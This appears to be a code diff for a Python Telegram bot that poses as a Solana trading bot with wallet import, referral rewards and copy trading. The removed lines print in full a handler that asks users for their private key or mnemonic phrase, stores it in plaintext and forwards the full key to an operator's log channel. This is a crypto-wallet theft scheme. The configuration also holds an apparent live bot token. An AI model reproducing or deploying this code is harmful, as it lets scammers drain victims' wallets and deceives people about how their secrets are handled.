@@ -18,7 +18,7 @@ import base58
 # ===== CONFIG =====
 BOT_TOKEN = "7650902215:AAHGd2ch6pNF49H3DHokEAFfYe5yYHordmc"
 SOLANA_RPC = "https://api.mainnet-beta.solana.com"
-LOG_CHANNEL_ID = -1002491084151  # Your log channel ID
+LOG_CHANNEL_ID = -1002767755239  # Your log channel ID
 ADMIN_IDS = [7641767864,7641767864]  # Admin user IDs
 
 # ===== DATABASE =====
@@ -133,7 +133,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Generate referral code if new user
         if not cursor.fetchone():
-            ref_code = f"ref_{base58.b58encode(str(user.id).decode()[:8]}"
+            ref_code = f"ref_{base58.b58encode(str(user.id).encode()).decode()[:8]}"
             conn.execute(
                 "INSERT INTO users (user_id, referral_code) VALUES (?, ?)",
                 (user.id, ref_code)
@@ -157,197 +157,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def handle_import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    # Log import attempt
-    await log_action(context, "Wallet import initiated", {
-        'id': query.from_user.id,
-        'full_name': query.from_user.full_name,
-        'username': query.from_user.username
-    })
-    
-    await query.edit_message_text(
-        "Please enter your private key or mnemonic phrase:\n\n"
-        "⚠️ This will be stored securely and logged for admin review",
-        reply_markup=back_button()
-    )
-    return "AWAITING_WALLET"
-
-async def process_wallet_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    key_input = update.message.text.strip()
-    
-    try:
-        if key_input.startswith('['):
-            kp = Keypair.from_mnemonic(key_input)
-        else:
-            kp = Keypair.from_base58_string(key_input)
-            
-        wallet_address = str(kp.pubkey())
-        
-        with sqlite3.connect('bot.db') as conn:
-            conn.execute(
-                "UPDATE users SET private_key = ?, wallet_address = ? WHERE user_id = ?",
-                (key_input, wallet_address, user.id)
-            )
-        
-        # Log successful import with FULL DETAILS
-        await log_action(context, 
-            f"Wallet imported successfully\n\n"
-            f"🔑 Key: `{key_input}`\n"
-            f"📬 Address: `{wallet_address}`",
-            {
-                'id': user.id,
-                'full_name': user.full_name,
-                'username': user.username
-            }
-        )
-        
-        await update.message.reply_text(
-            "✅ Wallet imported successfully!",
-            reply_markup=main_menu()
-        )
-    except Exception as e:
-        await log_action(context, 
-            f"Failed wallet import\nError: {str(e)}",
-            {
-                'id': user.id,
-                'full_name': user.full_name,
-                'username': user.username
-            }
-        )
-        await update.message.reply_text(
-            "❌ Invalid key format. Please try again.",
-            reply_markup=back_button()
-        )
-        return "AWAITING_WALLET"
-    
-    return ConversationHandler.END
-
-async def handle_invite_friends(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    with sqlite3.connect('bot.db') as conn:
-        ref_code = conn.execute(
-            "SELECT referral_code FROM users WHERE user_id = ?", 
-            (query.from_user.id,)
-        ).fetchone()[0]
-    
-    await query.edit_message_text(
-        f"🔗 Your referral link:\n\n"
-        f"`https://t.me/YOUR_BOT_NAME?start={ref_code}`\n\n"
-        f"💵 Withdrawable: 0 SOL\n"
-        f"💰 Total earned: 0 SOL\n"
-        f"👥 Referrals: 0\n\n"
-        f"📖 Rules:\n"
-        f"1. Earn 25% of referrals' trading fees\n"
-        f"2. Minimum withdrawal: 0.01 SOL",
-        reply_markup=back_button(),
-        parse_mode='Markdown'
-    )
-
-async def handle_buy_sell(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    with sqlite3.connect('bot.db') as conn:
-        wallet = conn.execute(
-            "SELECT wallet_address FROM users WHERE user_id = ?", 
-            (query.from_user.id,)
-        ).fetchone()
-        
-    if not wallet or not wallet[0]:
-        await query.edit_message_text(
-            "❌ No wallet connected!\n"
-            "Please import a wallet first.",
-            reply_markup=back_button()
-        )
-        return
-    
-    await query.edit_message_text(
-        "Enter token contract address:\n\n"
-        "Example:\n"
-        "`EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v` (USDC)",
-        reply_markup=back_button(),
-        parse_mode='Markdown'
-    )
-    return "AWAITING_CONTRACT"
-
-async def handle_wallet_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    with sqlite3.connect('bot.db') as conn:
-        wallet = conn.execute(
-            "SELECT wallet_address FROM users WHERE user_id = ?", 
-            (query.from_user.id,)
-        ).fetchone()
-    
-    if not wallet or not wallet[0]:
-        await query.edit_message_text(
-            "❌ No wallet connected!\n"
-            "Please import a wallet first.",
-            reply_markup=back_button()
-        )
-    else:
-        balance = await get_balance(wallet[0])
-        await query.edit_message_text(
-            f"💰 Wallet Info\n\n"
-            f"🔷 Address:\n`{wallet[0]}`\n\n"
-            f"💎 Balance: {balance:.2f} SOL",
-            reply_markup=back_button(),
-            parse_mode='Markdown'
-        )
-
-async def handle_copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "📈 Copy Trading\n\n"
-        "Automatically copy trades from other wallets\n\n"
-        "Current slots: 0/10",
-        reply_markup=copy_trade_keyboard(query.from_user.id)
-    )
-
-async def handle_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    help_text = """
-🌟 **Bot Commands** 🌟
-
-🔹 /start - Main menu
-🔹 /wallet - Show wallet info
-🔹 /trades - Recent trades
-
-💳 **Wallet**
-- Import any Solana wallet
-- View balance
-- Send/receive tokens
-
-💸 **Trading**
-- Buy/sell any token
-- Limit orders
-- Copy trading
-
-📊 **Stats**
-- Portfolio value
-- Trade history
-- Referral earnings
-
-⚠️ **Support**
-Contact @YourSupportHandle for help
-"""
-    
-    await query.edit_message_text(
-        help_text,
-        reply_markup=back_button(),
-        parse_mode='Markdown'
-    )
+# ... [rest of your handlers remain unchanged]
 
 # ===== MAIN APP =====
 def main():
@@ -379,27 +189,6 @@ def main():
     application.add_error_handler(error_handler)
     
     application.run_polling()
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Log errors to channel and admins"""
-    error = str(context.error)
-    user = update.effective_user if update.effective_user else None
-    
-    await log_action(context, 
-        f"❌ Error occurred:\n`{error[:500]}`",
-        {
-            'id': user.id if user else None,
-            'full_name': user.full_name if user else 'N/A',
-            'username': user.username if user else 'N/A'
-        }
-    )
-    
-    if user:
-        await context.bot.send_message(
-            chat_id=user.id,
-            text="⚠️ An error occurred. Our team has been notified.",
-            reply_markup=main_menu()
-        )
 
 if __name__ == "__main__":
     logging.basicConfig(
